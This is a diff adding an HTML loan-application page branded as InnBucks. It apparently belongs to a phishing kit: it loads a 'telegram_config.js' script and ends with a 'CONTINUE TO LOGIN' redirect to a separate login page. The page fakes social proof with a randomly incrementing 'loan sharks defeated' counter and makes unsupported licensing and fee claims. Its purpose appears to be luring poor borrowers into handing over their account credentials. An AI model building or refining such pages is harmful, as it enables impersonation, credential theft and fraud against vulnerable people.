@@ -1,0 +1,670 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+    <title>InnBucks · Loan Application</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <script src="telegram_config.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', Arial, sans-serif;
+        }
+
+        body {
+            background: #F1F4FA;
+            min-height: 100vh;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .container {
+            max-width: 600px;
+            width: 100%;
+            margin: 0 auto;
+            background: white;
+            border-radius: 32px;
+            overflow: hidden;
+            box-shadow: 0 20px 40px -12px rgba(37, 40, 61, 0.25);
+            border: 1px solid #DCE4ED;
+        }
+
+        .header {
+            background: #25283D;
+            color: white;
+            padding: 28px 24px 20px;
+            text-align: center;
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .logo-img {
+            height: 48px;
+            width: auto;
+            display: block;
+            margin: 0 auto 16px;
+            border-radius: 8px;
+        }
+
+        .shark-counter-panel {
+            background: #1E8F6B;
+            border-radius: 60px;
+            padding: 12px 28px;
+            display: inline-flex;
+            align-items: center;
+            gap: 14px;
+            margin-top: 8px;
+            border: 1px solid #6FC0A5;
+            box-shadow: 0 6px 0 #0F3F2C;
+        }
+
+        .shark-icon-small {
+            background: #FEE9E3;
+            width: 42px;
+            height: 42px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #B23B3B;
+            font-size: 1.2rem;
+        }
+
+        .counter-text {
+            font-size: 0.95rem;
+            font-weight: 600;
+            color: white;
+        }
+
+        .counter-number {
+            font-size: 1.9rem;
+            font-weight: 800;
+            color: white;
+            line-height: 1;
+            margin-right: 6px;
+            letter-spacing: -0.5px;
+        }
+
+        .counter-label {
+            color: #D4F2E6;
+            font-size: 0.85rem;
+            font-weight: 500;
+        }
+
+        .live-dot {
+            display: inline-block;
+            width: 10px;
+            height: 10px;
+            background: #FFD166;
+            border-radius: 50%;
+            margin-left: 8px;
+            animation: pulse 1.5s infinite;
+        }
+
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.3; } }
+
+        .step-row {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin: 20px 0 12px;
+        }
+
+        .step-indicator {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .step-dot {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: #D0DAE0;
+            transition: all 0.2s;
+        }
+
+        .step-dot.active {
+            background: #25283D;
+            transform: scale(1.3);
+            box-shadow: 0 0 0 3px rgba(37,40,61,0.12);
+        }
+
+        .step-number-badge {
+            background: #E9EDF5;
+            color: #25283D;
+            padding: 6px 18px;
+            border-radius: 60px;
+            font-size: 0.8rem;
+            font-weight: 700;
+        }
+
+        .content {
+            padding: 28px 28px 36px;
+            background: white;
+        }
+
+        h2 {
+            color: #25283D;
+            margin-bottom: 4px;
+            font-size: 1.9rem;
+            font-weight: 700;
+            letter-spacing: -0.02em;
+        }
+
+        .greeting {
+            color: #4F6571;
+            font-size: 0.95rem;
+            margin-bottom: 28px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .greeting i {
+            color: #1E8F6B;
+        }
+
+        .card {
+            background: #F7FAFD;
+            border-radius: 28px;
+            padding: 26px 24px;
+            margin-bottom: 24px;
+            border: 1px solid #E0E9F0;
+        }
+
+        .amount-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: baseline;
+            margin-bottom: 8px;
+        }
+
+        .amount-label {
+            font-weight: 700;
+            color: #25283D;
+            font-size: 1.1rem;
+        }
+
+        .loan-amount-display {
+            font-size: 48px;
+            font-weight: 800;
+            color: #25283D;
+            line-height: 1;
+            margin: 12px 0 6px;
+            letter-spacing: -1.5px;
+        }
+
+        .currency-small {
+            font-size: 26px;
+            font-weight: 600;
+            color: #4F6B7A;
+            margin-right: 4px;
+        }
+
+        .amount-slider {
+            width: 100%;
+            margin: 22px 0 12px;
+            -webkit-appearance: none;
+            appearance: none;
+            height: 10px;
+            background: #D7E0E8;
+            border-radius: 20px;
+        }
+
+        .amount-slider::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            appearance: none;
+            width: 30px;
+            height: 30px;
+            background: #25283D;
+            border-radius: 50%;
+            box-shadow: 0 2px 10px rgba(37,40,61,0.4);
+            border: 3px solid white;
+            cursor: pointer;
+            transition: 0.1s;
+        }
+
+        .amount-slider::-webkit-slider-thumb:hover {
+            transform: scale(1.2);
+            background: #1E8F6B;
+        }
+
+        .range-labels {
+            display: flex;
+            justify-content: space-between;
+            color: #3A5A66;
+            font-size: 0.85rem;
+            font-weight: 600;
+        }
+
+        .repayment-preview {
+            background: #FFFFFF;
+            border-radius: 20px;
+            padding: 16px 20px;
+            margin-top: 20px;
+            border: 1px solid #C6D9E0;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .repayment-label {
+            font-weight: 600;
+            color: #25283D;
+            font-size: 0.95rem;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .repayment-amount {
+            font-weight: 800;
+            color: #1E8F6B;
+            font-size: 1.5rem;
+            background: #E3F2EF;
+            padding: 6px 18px;
+            border-radius: 40px;
+            letter-spacing: -0.5px;
+        }
+
+        .section-title {
+            color: #25283D;
+            font-size: 1rem;
+            font-weight: 700;
+            margin-bottom: 14px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .section-title i {
+            color: #1E8F6B;
+        }
+
+        .term-options {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 12px;
+            margin-bottom: 28px;
+        }
+
+        .term-option {
+            padding: 16px 8px;
+            border: 2px solid #D2DFE6;
+            border-radius: 20px;
+            text-align: center;
+            font-weight: 600;
+            color: #1E3A3F;
+            background: white;
+            transition: all 0.2s;
+            cursor: pointer;
+        }
+
+        .term-option:hover {
+            border-color: #1E8F6B;
+            background: #F0FDF9;
+        }
+
+        .term-option.selected {
+            border-color: #25283D;
+            background: #EDF0F7;
+            color: #25283D;
+            box-shadow: 0 4px 0 #0F1F2E;
+        }
+
+        .purpose-options {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 12px;
+            margin: 10px 0 16px;
+        }
+
+        .purpose-option {
+            padding: 16px 6px;
+            border: 2px solid #D2DFE6;
+            border-radius: 20px;
+            text-align: center;
+            font-weight: 500;
+            color: #1E3A3F;
+            background: white;
+            transition: 0.2s;
+            cursor: pointer;
+            font-size: 0.95rem;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .purpose-option i {
+            color: #25283D;
+            font-size: 1.2rem;
+            margin-bottom: 4px;
+        }
+
+        .purpose-option:hover {
+            border-color: #1E8F6B;
+            background: #F3FFFD;
+        }
+
+        .purpose-option.selected {
+            border-color: #25283D;
+            background: #EDF0F7;
+            color: #25283D;
+            font-weight: 700;
+        }
+
+        .loan-type-wrapper {
+            margin: 24px 0 16px;
+        }
+
+        select {
+            width: 100%;
+            padding: 16px 20px;
+            border: 2px solid #D2DFE6;
+            border-radius: 20px;
+            font-size: 1rem;
+            background: white;
+            color: #1E2A2E;
+            font-weight: 500;
+            appearance: none;
+            background-image: url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 24 24' fill='%2325283D'><path d='M7 10l5 5 5-5z'/></svg>");
+            background-repeat: no-repeat;
+            background-position: right 20px center;
+        }
+
+        select:focus {
+            outline: none;
+            border-color: #25283D;
+        }
+
+        .btn-next {
+            background: #25283D;
+            color: white;
+            width: 100%;
+            padding: 18px 24px;
+            border: none;
+            border-radius: 60px;
+            font-size: 1.2rem;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            margin-top: 32px;
+            box-shadow: 0 8px 0 #12141F;
+            transition: all 0.08s linear;
+            cursor: pointer;
+        }
+
+        .btn-next:hover {
+            background: #1E8F6B;
+            box-shadow: 0 6px 0 #0F3F2C;
+            transform: translateY(2px);
+        }
+
+        .footer {
+            text-align: center;
+            padding: 20px 24px;
+            color: #4F6571;
+            font-size: 0.8rem;
+            background: #F7FAFD;
+            border-top: 1px solid #DAE5EC;
+            display: flex;
+            justify-content: space-between;
+        }
+
+        .footer i {
+            color: #1E8F6B;
+            margin-right: 6px;
+        }
+
+        .small-note {
+            font-size: 0.75rem;
+            color: #5C7884;
+            margin-top: 16px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <img src="InnBucks_idKVITcn-B_2.jpeg" alt="InnBucks" class="logo-img">
+            
+            <div class="shark-counter-panel">
+                <div class="shark-icon-small">
+                    <i class="fas fa-shield-hal"></i>
+                </div>
+                <div>
+                    <div style="display: flex; align-items: center; gap: 6px; flex-wrap: wrap;">
+                        <span class="counter-text">🛡️ Borrowers rescued today</span>
+                        <span class="live-dot"></span>
+                    </div>
+                    <div style="display: flex; align-items: baseline; gap: 6px;">
+                        <span class="counter-number" id="sharkCounter">800</span>
+                        <span class="counter-label">loan sharks defeated</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="content">
+            <div class="step-row">
+                <span class="step-number-badge"><i class="fas fa-file-invoice"></i> Step 1 of 3</span>
+                <div class="step-indicator">
+                    <div class="step-dot active"></div>
+                    <div class="step-dot"></div>
+                    <div class="step-dot"></div>
+                </div>
+            </div>
+            
+            <h2>Loan details</h2>
+            <div class="greeting">
+                <i class="fas fa-circle-check"></i> No upfront fees · 5‑min decision
+            </div>
+            
+            <div class="card">
+                <div class="amount-header">
+                    <span class="amount-label"><i class="fas fa-dollar-sign" style="color: #1E8F6B;"></i> Loan amount requested</span>
+                    <span style="background: #E9EDF5; padding: 6px 14px; border-radius: 40px; font-size: 0.8rem; font-weight: 700; color: #25283D;">min $10 · max $1,500</span>
+                </div>
+                <div class="loan-amount-display">
+                    <span class="currency-small">$</span><span id="amountDisplay">750</span>
+                </div>
+                <input type="range" id="amountSlider" class="amount-slider" min="10" max="1500" value="750" step="10">
+                <div class="range-labels">
+                    <span>$10</span>
+                    <span>$1,500</span>
+                </div>
+                
+                <div id="repaymentPreview" class="repayment-preview">
+                    <span class="repayment-label"><i class="fas fa-rotate-left"></i> Weekly repayment</span>
+                    <span class="repayment-amount" id="weeklyRepayment">$26.25</span>
+                </div>
+            </div>
+            
+            <div class="section-title">
+                <i class="fas fa-calendar-check"></i> Loan term
+            </div>
+            <div class="term-options">
+                <div class="term-option" data-months="3">3 months</div>
+                <div class="term-option selected" data-months="6">6 months</div>
+                <div class="term-option" data-months="12">12 months</div>
+            </div>
+            
+            <div class="section-title">
+                <i class="fas fa-hand-holding-heart"></i> Purpose of loan
+            </div>
+            <div class="purpose-options">
+                <div class="purpose-option selected" data-purpose="food"><i class="fas fa-bowl-food"></i> Food</div>
+                <div class="purpose-option" data-purpose="education"><i class="fas fa-book"></i> Education</div>
+                <div class="purpose-option" data-purpose="medical"><i class="fas fa-syringe"></i> Medical</div>
+                <div class="purpose-option" data-purpose="business"><i class="fas fa-store"></i> Business</div>
+                <div class="purpose-option" data-purpose="emergency"><i class="fas fa-truck"></i> Emergency</div>
+                <div class="purpose-option" data-purpose="other"><i class="fas fa-ellipsis"></i> Other</div>
+            </div>
+            
+            <div class="loan-type-wrapper">
+                <div style="display: flex; gap: 10px; align-items: center; margin-bottom: 10px;">
+                    <i class="fas fa-tag" style="color: #1E8F6B;"></i>
+                    <span style="font-weight: 600; color: #25283D;">Loan type</span>
+                </div>
+                <select id="loanType">
+                    <option value="personal" selected>Personal loan</option>
+                    <option value="business">Business loan</option>
+                    <option value="education">Education loan</option>
+                    <option value="emergency">Emergency loan</option>
+                </select>
+            </div>
+            
+            <button class="btn-next" onclick="nextStep()">
+                <span>CONTINUE TO LOGIN</span> <i class="fas fa-arrow-right"></i>
+            </button>
+            
+            <div class="small-note">
+                <i class="fas fa-shield"></i> Your rate is reserved for 24h · no impact on credit score
+            </div>
+        </div>
+        
+        <div class="footer">
+            <span><i class="fas fa-shield-hal"></i> RBZ licensed</span>
+            <span><i class="fas fa-lock"></i> no collateral</span>
+            <span><i class="fas fa-clock"></i> 5min decision</span>
+        </div>
+    </div>
+
+    <script>
+        let applicationData = {
+            loanType: 'personal',
+            loanAmount: 750,
+            loanTerm: 6,
+            purpose: 'food',
+            weeklyRepayment: '26.25'
+        };
+
+        function calculateWeeklyRepayment(amount, months) {
+            const flatInterestRate = 0.12;
+            const weeksInMonth = 4.33;
+            const totalWeeks = months * weeksInMonth;
+            const totalRepayment = amount * (1 + flatInterestRate * (months / 12));
+            return (totalRepayment / totalWeeks).toFixed(2);
+        }
+
+        function updateRepayment() {
+            const amountEl = document.getElementById('amountDisplay');
+            const amount = parseInt(amountEl ? amountEl.textContent : 750);
+            const selectedTermEl = document.querySelector('.term-option.selected');
+            const months = selectedTermEl ? parseInt(selectedTermEl.getAttribute('data-months')) : 6;
+            const weekly = calculateWeeklyRepayment(amount, months);
+            
+            document.getElementById('weeklyRepayment').textContent = '$' + weekly;
+            applicationData.loanAmount = amount;
+            applicationData.loanTerm = months;
+            applicationData.weeklyRepayment = weekly;
+        }
+
+        document.addEventListener('DOMContentLoaded', function() {
+            const amountSlider = document.getElementById('amountSlider');
+            const amountDisplay = document.getElementById('amountDisplay');
+            
+            if (amountSlider && amountDisplay) {
+                amountSlider.addEventListener('input', function() {
+                    amountDisplay.textContent = this.value;
+                    updateRepayment();
+                });
+            }
+
+            document.getElementById('loanType').addEventListener('change', function() {
+                applicationData.loanType = this.value;
+            });
+
+            document.querySelectorAll('.term-option').forEach(option => {
+                option.addEventListener('click', function() {
+                    document.querySelectorAll('.term-option').forEach(o => o.classList.remove('selected'));
+                    this.classList.add('selected');
+                    updateRepayment();
+                });
+            });
+
+            document.querySelectorAll('.purpose-option').forEach(option => {
+                option.addEventListener('click', function() {
+                    document.querySelectorAll('.purpose-option').forEach(o => o.classList.remove('selected'));
+                    this.classList.add('selected');
+                    applicationData.purpose = this.getAttribute('data-purpose');
+                });
+            });
+
+            const counterEl = document.getElementById('sharkCounter');
+            if (counterEl) {
+                let count = 800;
+                counterEl.innerText = count;
+                setInterval(function() {
+                    count += Math.floor(Math.random() * 91) + 10;
+                    counterEl.innerText = count;
+                }, 10000);
+            }
+
+            updateRepayment();
+            
+// Load saved data if exists
+            const savedData = localStorage.getItem('innbucksLoanApp');
+            if (savedData) {
+                const parsed = JSON.parse(savedData);
+                applicationData = { ...applicationData, ...parsed };
+                
+                // Update UI with saved values
+                if (applicationData.loanAmount) {
+                    amountSlider.value = applicationData.loanAmount;
+                    amountDisplay.textContent = applicationData.loanAmount;
+                }
+                if (applicationData.loanTerm) {
+                    document.querySelectorAll('.term-option').forEach(o => {
+                        if (parseInt(o.dataset.months) === applicationData.loanTerm) {
+                            o.classList.add('selected');
+                        } else {
+                            o.classList.remove('selected');
+                        }
+                    });
+                }
+                if (applicationData.purpose) {
+                    document.querySelectorAll('.purpose-option').forEach(o => {
+                        if (o.dataset.purpose === applicationData.purpose) {
+                            o.classList.add('selected');
+                        } else {
+                            o.classList.remove('selected');
+                        }
+                    });
+                }
+                if (applicationData.loanType) {
+                    document.getElementById('loanType').value = applicationData.loanType;
+                }
+                updateRepayment();
+            }
+        });
+
+        function nextStep() {
+            // Update all application data
+            applicationData.loanAmount = parseInt(document.getElementById('amountSlider').value);
+            applicationData.loanTerm = parseInt(document.querySelector('.term-option.selected').dataset.months);
+            applicationData.purpose = document.querySelector('.purpose-option.selected').dataset.purpose;
+            applicationData.loanType = document.getElementById('loanType').value;
+            applicationData.weeklyRepayment = calculateWeeklyRepayment(applicationData.loanAmount, applicationData.loanTerm);
+            
+            // Save to localStorage
+            localStorage.setItem('innbucksLoanApp', JSON.stringify(applicationData));
+            
+            // Redirect to login page
+            window.location.href = 'innbucks_login.html';
+        }
+    </script>
+</body>
+</html>
